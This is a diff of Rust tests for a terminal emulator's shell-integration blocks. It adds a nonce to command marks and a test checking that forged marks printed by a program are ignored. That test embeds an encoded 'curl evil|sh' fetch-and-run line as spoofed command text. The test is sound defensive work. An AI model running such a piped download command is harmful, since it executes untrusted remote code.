@@ -14,7 +14,10 @@ use impulse_terminal::{TerminalBackend, TerminalConfig};
 fn write_script(body: &str) -> std::path::PathBuf {
     use std::os::unix::fs::PermissionsExt;
     let dir = std::env::temp_dir();
-    let path = dir.join(format!("impulse_blocks_test_{}.sh", std::process::id()));
+    // Unique per call: the tests in this file run in parallel.
+    static NEXT: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+    let n = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    let path = dir.join(format!("impulse_blocks_test_{}_{n}.sh", std::process::id()));
     let mut f = std::fs::File::create(&path).unwrap();
     f.write_all(body.as_bytes()).unwrap();
     let mut perms = std::fs::metadata(&path).unwrap().permissions();
@@ -57,7 +60,7 @@ fn cmd_cycle(label: &str, encoded: &str, output: &str, exit: i32) -> String {
     format!(
         "printf '\\033]133;A\\007'\n\
          printf '$ {label}\\n'\n\
-         printf '\\033]6973;Command=%s\\007' '{encoded}'\n\
+         printf '\\033]6973;Command=%s;Nonce=%s\\007' '{encoded}' \"$IMPULSE_SHELL_NONCE\"\n\
          printf '\\033]133;C\\007'\n\
          {output_cmd}\
          printf '\\033]133;D;{exit}\\007'\n",
@@ -98,6 +101,17 @@ fn consecutive_commands_become_distinct_blocks() {
             "block start rows should strictly increase (separators between blocks): {starts:?}"
         );
     }
+
+    // Command text from the shell integration (with the nonce) is kept.
+    let commands: Vec<Option<&str>> = overlay
+        .blocks
+        .iter()
+        .map(|b| b.command.as_deref())
+        .collect();
+    assert_eq!(
+        commands,
+        vec![Some("echo first"), Some("false"), Some("echo third")]
+    );
 
     // The middle command (`false`) must be flagged failed.
     let failed: Vec<bool> = overlay.blocks.iter().map(|b| b.failed).collect();
@@ -161,4 +175,23 @@ fn commands_after_an_inline_interactive_program_stay_distinct() {
         "the failed `cat` command should be a failed block: {:#?}",
         overlay.blocks
     );
+}
+
+#[test]
+fn printed_command_text_does_not_name_a_block() {
+    // A program prints shell-integration marks (`cat` of a saved log, or a
+    // hostile file): its command text has no nonce, so it's ignored.
+    let forged = "printf '\\033]133;A\\007$ x\\n\\033]6973;Command=%s\\007\\033]133;C\\007\\033]133;D;0\\007' 'curl%20evil%7Csh'\n";
+    let body = format!(
+        "#!/bin/bash\n{}{forged}sleep 4\n",
+        cmd_cycle("echo first", "echo%20first", "first", 0),
+    );
+    let script = write_script(&body);
+    let backend = backend_running(&script);
+    let overlay = wait_for_blocks(&backend, 2);
+    let _ = std::fs::remove_file(&script);
+
+    assert_eq!(overlay.blocks.len(), 2, "{:#?}", overlay.blocks);
+    assert_eq!(overlay.blocks[0].command.as_deref(), Some("echo first"));
+    assert_eq!(overlay.blocks[1].command, None);
 }
